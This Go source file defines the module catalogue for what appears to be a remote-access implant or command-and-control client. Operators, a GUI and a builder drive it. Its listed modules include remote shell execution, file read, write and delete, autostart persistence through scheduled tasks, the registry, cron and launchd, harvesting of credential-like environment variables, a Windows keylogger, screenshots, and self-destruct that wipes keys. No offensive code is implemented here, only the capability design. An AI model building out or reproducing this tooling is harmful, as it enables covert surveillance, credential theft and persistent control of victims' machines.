// Package catalog describes the built-in client modules so operators, the GUI
// and the builder agree on names, arguments and platform support.
package catalog

// Arg describes one module argument.
type Arg struct {
	Name     string `json:"name"`
	Type     string `json:"type"` // string|int|bool|b64
	Required bool   `json:"required"`
	Desc     string `json:"desc"`
}

// Module is one client-side capability.
type Module struct {
	Name        string   `json:"name"`
	Summary     string   `json:"summary"`
	Platforms   []string `json:"platforms"`
	Capability  string   `json:"capability,omitempty"`
	Destructive bool     `json:"destructive"`
	Operator    string   `json:"min_role"` // viewer|operator|admin
	Args        []Arg    `json:"args"`
}

// Modules is the built-in catalog.
var Modules = []Module{
	{Name: "ping", Summary: "Round-trip liveness check", Platforms: []string{"windows", "linux", "darwin", "android"}, Operator: "viewer"},
	{Name: "sysinfo", Summary: "Host, OS, arch, user, pid, addresses, uptime", Platforms: []string{"windows", "linux", "darwin", "android"}, Operator: "viewer"},
	{Name: "net_info", Summary: "Interface and route inventory", Platforms: []string{"windows", "linux", "darwin", "android"}, Operator: "viewer"},
	{Name: "proc_list", Summary: "Process listing (pid, name, user)", Platforms: []string{"windows", "linux", "darwin"}, Operator: "viewer"},
	{Name: "proc_kill", Summary: "Terminate a process by pid", Platforms: []string{"windows", "linux", "darwin"}, Operator: "operator", Destructive: true,
		Args: []Arg{{Name: "pid", Type: "int", Required: true, Desc: "target pid"}}},
	{Name: "shell", Summary: "Execute a command through the platform shell", Platforms: []string{"windows", "linux", "darwin", "android"}, Capability: "exec", Operator: "operator", Destructive: true,
		Args: []Arg{{Name: "cmd", Type: "string", Required: true, Desc: "command line"}, {Name: "timeout_ms", Type: "int", Desc: "default 30000"}}},
	{Name: "fs_ls", Summary: "List a directory", Platforms: []string{"windows", "linux", "darwin", "android"}, Operator: "viewer",
		Args: []Arg{{Name: "path", Type: "string", Required: true, Desc: "directory"}}},
	{Name: "fs_cat", Summary: "Read a file (base64, size-limited)", Platforms: []string{"windows", "linux", "darwin", "android"}, Operator: "operator",
		Args: []Arg{{Name: "path", Type: "string", Required: true, Desc: "file"}, {Name: "max", Type: "int", Desc: "max bytes, default 4MiB"}}},
	{Name: "fs_put", Summary: "Write a file from base64 data", Platforms: []string{"windows", "linux", "darwin", "android"}, Operator: "operator", Destructive: true,
		Args: []Arg{{Name: "path", Type: "string", Required: true, Desc: "file"}, {Name: "data_b64", Type: "b64", Required: true, Desc: "content"}, {Name: "append", Type: "bool", Desc: "append instead of overwrite"}}},
	{Name: "fs_rm", Summary: "Delete a file", Platforms: []string{"windows", "linux", "darwin", "android"}, Operator: "operator", Destructive: true,
		Args: []Arg{{Name: "path", Type: "string", Required: true, Desc: "file"}}},
	{Name: "persist_install", Summary: "Install autostart (schtasks/registry, cron/systemd-user, launchd)", Platforms: []string{"windows", "linux", "darwin"}, Capability: "persist", Operator: "operator", Destructive: true,
		Args: []Arg{{Name: "name", Type: "string", Desc: "entry name"}}},
	{Name: "persist_remove", Summary: "Remove installed autostart entries", Platforms: []string{"windows", "linux", "darwin"}, Capability: "persist", Operator: "operator"},
	{Name: "creds_env", Summary: "Collect credential-like environment variables and common config paths", Platforms: []string{"windows", "linux", "darwin"}, Capability: "creds", Operator: "operator"},
	{Name: "screenshot", Summary: "Capture the desktop (Windows GDI)", Platforms: []string{"windows"}, Capability: "screen", Operator: "operator"},
	{Name: "keylog_start", Summary: "Poll key state into a ring buffer (Windows)", Platforms: []string{"windows"}, Capability: "keylog", Operator: "operator", Destructive: true},
	{Name: "keylog_stop", Summary: "Stop key logging and return the buffer", Platforms: []string{"windows"}, Capability: "keylog", Operator: "operator"},
	{Name: "update_stage", Summary: "Verify and stage a signed update artifact", Platforms: []string{"windows", "linux", "darwin", "android"}, Operator: "admin",
		Args: []Arg{{Name: "version", Type: "string", Required: true}, {Name: "url", Type: "string", Required: true}, {Name: "sha256", Type: "string", Required: true}}},
	{Name: "selfdestruct", Summary: "Remove persistence, wipe keys and delete the binary", Platforms: []string{"windows", "linux", "darwin"}, Operator: "admin", Destructive: true},
}

// Find returns a module by name.
func Find(name string) (Module, bool) {
	for _, m := range Modules {
		if m.Name == name {
			return m, true
		}
	}
	return Module{}, false
}
